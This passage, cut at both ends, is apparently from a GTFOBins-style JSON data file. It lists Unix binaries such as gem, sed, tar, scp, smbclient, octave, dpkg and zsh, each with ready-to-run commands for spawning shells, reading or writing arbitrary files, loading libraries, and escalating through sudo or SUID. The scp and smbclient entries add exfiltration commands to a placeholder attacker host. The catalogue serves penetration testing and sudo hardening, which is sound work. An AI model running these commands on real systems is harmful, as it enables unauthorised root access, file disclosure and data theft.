          "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem build $TF/x\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/x\ngem install --file $TF/x\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "check_ssl_cert": {
    "description": "This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.\n",
    "functions": {
      "command": [
        {
          "code": "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        }
      ],
      "sudo": [
        {
          "code": "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "vigr": {
    "description": "This command allows to edit some designated files (`/etc/passwd`, `/etc/group`, `/etc/shadow` and `/etc/gshadow`) safely by spawning the default editor (falling back to [`vim`](/gtfobins/vim/), other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with `sudo`.",
    "functions": {
      "suid": [
        {
          "code": "./vigr",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo vigr",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "strings": {
    "description": "This only returns ASCII strings, thus it is not suitable for binary files.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nstrings \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./strings \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo strings \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ntpdate": {
    "description": "The file is actually parsed and lines are leaked through error messages.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nntpdate -a x -k $LFILE -d localhost\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo ntpdate -a x -k $LFILE -d localhost\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./ntpdate -a x -k $LFILE -d localhost\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "octave": {
    "description": "The payloads are compatible with GUI.",
    "functions": {
      "shell": [
        {
          "code": "octave-cli --eval 'system(\"/bin/sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "octave-cli --eval 'filename = \"file_to_write\"; fid = fopen(filename, \"w\"); fputs(fid, \"DATA\"); fclose(fid);'",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "octave-cli --eval 'format none; fid = fopen(\"file_to_read\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo octave-cli --eval 'system(\"/bin/sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./octave-cli --eval 'system(\"/bin/sh\")'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "screen": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "screen",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nscreen -L -Logfile $LFILE echo DATA\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        },
        {
          "code": "LFILE=file_to_write\nscreen -L $LFILE echo DATA\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo screen",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dpkg": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "dpkg -l\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo dpkg -l\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo dpkg -i x_1.0_all.deb",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "check_cups": {
    "description": "This is the `check_cups` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "bzip2": {
    "description": "There are also a number of other utilities that rely on `bzip2` under the hood, e.g., `bzless`, `bzcat`, `bunzip2`, etc. Besides having similar features, they also allow privileged reads if `bzip2` itself is SUID.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nbzip2 -c $LFILE | bzip2 -d\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "scp": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-upload": [
        {
          "code": "RPATH=user@attacker.com:~/file_to_save\nLPATH=file_to_send\nscp $LFILE $RPATH\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "RPATH=user@attacker.com:~/file_to_get\nLFILE=file_to_save\nscp $RPATH $LFILE\n",
          "description": "It can download remote files."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF a b:\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "runscript": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nrunscript $TF\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\n./runscript $TF\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nsudo runscript $TF\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "posh": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "posh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "./posh",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo posh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tdbtool": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "tdbtool\n! /bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo tdbtool\n! /bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./tdbtool\n! /bin/sh\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "sed": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "sed -n '1e exec sh 1>&0' /etc/hosts",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "sed e",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "command": [
        {
          "code": "sed -n '1e id' /etc/hosts",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nsed -n \"1s/.*/DATA/w $LFILE\" /etc/hosts\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nsed '' \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo sed -n '1e exec sh 1>&0' /etc/hosts",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "cabal": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "cabal exec -- /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./cabal exec -- /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo cabal exec -- /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "fish": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "fish",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./fish",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo fish",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "msguniq": {
    "description": "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nmsguniq -P $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo msguniq -P $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./msguniq -P $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "smbclient": {
    "description": "A valid SMB/CIFS server must be available.",
    "functions": {
      "shell": [
        {
          "code": "smbclient '\\\\attacker\\share'\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-upload": [
        {
          "code": "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "smbclient '\\\\attacker\\share' -c 'put file_to_send where_to_save'\n",
          "description": "It can download remote files."
        }
      ],
      "sudo": [
        {
          "code": "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "rpmquery": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "./rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "mount": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "setlock": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp)\nsetlock $TF /bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./setlock - /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo setlock - /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ginsh": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ginsh\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "limited-suid": [
        {
          "code": "./ginsh\n!/bin/sh\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo ginsh\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "rake": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file-to-read\nrake -f $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "rake -p '`/bin/sh 1>&0`'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo rake -p '`/bin/sh 1>&0`'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./rake -p '`/bin/sh 1>&0`'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "psql": {
    "description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
    "functions": {
      "shell": [
        {
          "code": "psql\n\\?\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "psql\n\\?\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "zsh": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "export LFILE=file_to_read\nzsh -c 'echo \"$(<$LFILE)\"'\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "export LFILE=file_to_write\nzsh -c 'echo DATA >$LFILE'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "shell": [
        {
          "code": "zsh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./zsh",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo zsh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "mv": {
    "description": "This can be used to move and then read or write files from a restricted file systems or with elevated privileges.",
    "functions": {
      "suid": [
        {
          "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "exiftool": {
    "description": "If the permissions allow it, files are moved (instead of copied) to the destination.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nOUTPUT=output_file\nexiftool -filename=$OUTPUT $LFILE\ncat $OUTPUT\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nINPUT=input_file\nexiftool -filename=$LFILE $INPUT\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "dd": {
    "description": "",
    "functions": {
      "file-write": [
        {
          "code": "LFILE=file_to_write\necho \"DATA\" | dd of=$LFILE\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\ndd if=$LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ssh-keygen": {
    "description": "",
    "functions": {
      "library-load": [
        {
          "code": "ssh-keygen -D ./lib.so",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "sudo": [
        {
          "code": "sudo ssh-keygen -D ./lib.so",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./ssh-keygen -D ./lib.so",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "dialog": {
    "description": "The file is shown in an interactive TUI dialog, thus it is not suitable for binary/too big data.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ndialog --textbox \"$LFILE\" 0 0\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "logsave": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "logsave /dev/null /bin/sh -i",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo logsave /dev/null /bin/sh -i",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "./logsave /dev/null /bin/sh -i -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "sudo": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "sudo sudo /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "tar": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
